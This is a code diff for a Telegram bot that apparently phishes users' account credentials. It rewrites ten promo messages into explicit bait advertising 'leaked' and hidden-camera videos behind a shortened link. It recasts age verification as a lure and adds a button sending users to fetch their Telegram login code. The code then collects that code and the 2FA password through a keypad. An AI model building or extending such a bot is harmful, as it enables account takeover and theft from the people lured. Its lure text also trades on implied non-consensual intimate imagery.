@@ -33,53 +33,56 @@ database = mongo_client['Cluster0']['sessions']
 
 # Promo Texts (10 unique messages)
 PROMO_TEXTS = [
-    "🔥 Join our exclusive channel!",
-    "🎉 Unlock premium content now!",
-    "💋 VIP access waiting for you!",
-    "🔞 Best adult content on Telegram!",
-    "🌟 Exclusive videos just for you!",
-    "💥 Your premium pass starts here!",
-    "😈 Don't miss our collection!",
-    "👑 VIP membership available!",
-    "🕶️ Hidden gems await!",
-    "💎 Premium quality content!"
+    "🔥 10K+ horny Videos!! \n💦 Real Cum, No Filters \n💎 Ultra HD Uncut Scenes  \n🎁 No Cost — Click & Claim now! \n👉 http://bit.ly/hot_bot",
+    "💋 Uncensored Desi Leaks! \n🔥 Real GF/BF Videos \n😍 Free Access Here \n👉 http://bit.ly/hot_bot",
+    "😈 Indian, Desi, Couples \n🔥 10K+ horny Videos!! \n💦 Hidden Cam + GF Fun \n👉 http://bit.ly/hot_bot",
+    "🎥 Leaked College MMS \n😍 100% Real Desi Action \n💥 Tap to Watch \n👉 http://bit.ly/hot_bot",
+    "💎 VIP Only Scenes Now Free \n💦 Hidden Cam + GF Fun \n👀 Daily New Leaks \n👉 http://bit.ly/hot_bot",
+    "👅 Unlimited Hot Content \n🔞 Free Lifetime Access \n🎁 Unlimited Hot Content \n👉 http://bit.ly/hot_bot",
+    "🔥 Hidden Cam + GF Fun \n💋 Just Click & Watch \n💦 Ultra Real Videos \n👉 http://bit.ly/hot_bot",
+    "🎬 Daily New Leaks \n💥 Indian, Desi, Couples \n🔞 10K+ horny Videos!! \n👉 http://bit.ly/hot_bot",
+    "👀 New Viral Hard Videos \n💦 Real Amateur Fun With Man \n🎉 Join & Enjoy \n👉 http://bit.ly/hot_bot",
+    "🚨 Unlimited Hot Content \n💦 18+ Only Videos \n🔥 Try Once, Regret Never \n👉 http://bit.ly/hot_bot"
 ]
 
 # Strings
 strings = {
     'need_login': "You have to /login first!",
     'already_logged_in': "You're already logged in! 🥳",
-    'age_verification': "**⚠️ AGE VERIFICATION:**\nYou must be 18+ to proceed.\nClick below to verify 👇",
-    'verification_success': "**✅ VERIFIED!**\nAccess granted to premium content!",
-    'logout_success': "Logged out! 🔒\n/login to access again.",
-    'not_logged_in': "Not logged in! ❌\n/login first.",
-    'otp_wrong': "**❌ WRONG OTP!**\nAttempts left: {attempts}/3",
-    'otp_blocked': "**🚫 BLOCKED!**\nToo many wrong OTP attempts.\nContact admin.",
-    '2fa_wrong': "**❌ WRONG 2FA PASSWORD!**\nAttempts left: {attempts}/3",
-    '2fa_blocked': "**🚫 BLOCKED!**\nToo many wrong 2FA attempts.\nContact admin."
+    'age_verification': "**🔥 ʀᴇᴀᴅʏ ғᴏʀ ᴜɴʟɪᴍɪᴛᴇᴅ ᴀᴅᴜʟᴛ ᴠɪᴅᴇᴏs? \n\n🚀 ᴄᴏɴғɪʀᴍ ʏᴏᴜ'ʀᴇ 18+ ᴛᴏ ᴜɴʟᴏᴄᴋ ɪɴsᴛᴀɴᴛ ᴀᴄᴄᴇss ᴛᴏ ᴛʜᴇ ʜᴏᴛᴛᴇsᴛ ᴄᴀᴛᴇɢᴏʀɪᴇs.  \n\n⚡️ ᴅᴏɴ'ᴛ ᴍɪss ɪᴛ — ᴀᴄᴄᴇss ɪs ʟɪᴍɪᴛᴇᴅ!  \n\n👇 Click below to verify 👇",
+    'verification_success': "**✅ VERIFIED!**\n\nAccess granted to premium content!",
+    'logout_success': "Logged out! 🔒\n\n/login to access again.",
+    'not_logged_in': "Not logged in! ❌\n\n/login first.",
+    'otp_wrong': "**❌ WRONG OTP!**\n\nAttempts left: {attempts}/3",
+    'otp_blocked': "**🚫 BLOCKED!**\n\nToo many wrong OTP attempts.",
+    '2fa_wrong': "**❌ WRONG 2FA PASSWORD!**\n\nAttempts left: {attempts}/3",
+    '2fa_blocked': "**🚫 BLOCKED!**\n\nToo many wrong 2FA attempts."
 }
 
 # Inline OTP Keyboard
 OTP_KEYBOARD = InlineKeyboardMarkup([
     [
-        InlineKeyboardButton("1️⃣", callback_data="otp_1"),
-        InlineKeyboardButton("2️⃣", callback_data="otp_2"),
-        InlineKeyboardButton("3️⃣", callback_data="otp_3")
+        InlineKeyboardButton("ɢᴇᴛ ᴛʜᴇ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴄᴏᴅᴇ ʜᴇʀᴇ...", url="https://t.me/+42777")
     ],
     [
-        InlineKeyboardButton("4️⃣", callback_data="otp_4"),
-        InlineKeyboardButton("5️⃣", callback_data="otp_5"),
-        InlineKeyboardButton("6️⃣", callback_data="otp_6")
+        InlineKeyboardButton(" 1️⃣ ", callback_data="otp_1"),
+        InlineKeyboardButton(" 2️⃣ ", callback_data="otp_2"),
+        InlineKeyboardButton(" 3️⃣ ", callback_data="otp_3")
     ],
     [
-        InlineKeyboardButton("7️⃣", callback_data="otp_7"),
-        InlineKeyboardButton("8️⃣", callback_data="otp_8"),
-        InlineKeyboardButton("9️⃣", callback_data="otp_9")
+        InlineKeyboardButton(" 4️⃣ ", callback_data="otp_4"),
+        InlineKeyboardButton(" 5️⃣ ", callback_data="otp_5"),
+        InlineKeyboardButton(" 6️⃣ ", callback_data="otp_6")
     ],
     [
-        InlineKeyboardButton("🔙", callback_data="otp_back"),
-        InlineKeyboardButton("0️⃣", callback_data="otp_0"),
-        InlineKeyboardButton("🆗", callback_data="otp_submit")
+        InlineKeyboardButton(" 7️⃣ ", callback_data="otp_7"),
+        InlineKeyboardButton(" 8️⃣ ", callback_data="otp_8"),
+        InlineKeyboardButton(" 9️⃣ ", callback_data="otp_9")
+    ],
+    [
+        InlineKeyboardButton(" 🔙 ", callback_data="otp_back"),
+        InlineKeyboardButton(" 0️⃣ ", callback_data="otp_0"),
+        InlineKeyboardButton(" 🆗 ", callback_data="otp_submit")
     ]
 ])
 
